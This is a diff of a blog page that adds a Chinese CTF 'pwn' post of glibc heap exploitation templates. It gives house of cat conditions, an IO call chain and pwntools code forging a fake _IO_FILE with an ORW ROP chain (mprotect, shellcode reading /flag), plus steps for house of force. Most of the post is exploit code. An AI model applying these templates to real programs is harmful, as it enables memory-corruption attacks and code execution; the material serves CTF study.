@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>命令执行 | Masco&#39;s blog</title>
+    <title>house of模板 | Masco&#39;s blog</title>
     <meta name="author" content="Masco" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -146,7 +146,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>命令执行</h1>
+        <h1>house of模板</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -157,10 +157,99 @@
         </span>
         
         
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #03a9f4">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/IO/" style="color: #ff7d73">
+                    IO
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/house-of/" style="color: #00a596">
+                    house of
+                </a>
+            </span>
+            
+        </span>
+        
     </div>
     
     <div class="content" v-pre>
-        
+        <h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
+
+<hr>
+<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
+<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
+<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
+next_chain = 0
+fake_IO_FILE=p64(rdi)         #_flags=rdi
+fake_IO_FILE+=p64(0)*7
+fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
+fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
+fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
+fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
+fake_IO_FILE += p64(0)  # _chain
+fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
+fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
+fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
+fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
+fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
+fake_IO_FILE += p64(1) #mode=1
+fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
+fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
+fake_IO_FILE +=p64(0)*6
+fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
+</code></pre>
+<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
+<br>
+
+<p>例子orw：  </p>
+<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
+Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
+Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
+Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
+Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
+Fake_IO_File_Structure._offset = 0
+Fake_IO_File_Structure._vtable_offset = 0
+Fake_IO_File_Structure._mode = 1
+Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
+
+Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
+Fake_IO_File_Structure += p64(0) * 6
+Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
+Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
+rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
+
+Fake_IO_File_Structure += rop
+</code></pre>
+<br>
+<br> 
+
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
+<p><em>利用流程：</em></p>
+<pre><code>修改topchunk_size为0xffffffffffffffff
+计算target_size=target_addrtopchunk_addr-0x30
+malloc一个chunk
+getshell
+ 
+</code></pre>
+<hr>
+
     </div>
     
     
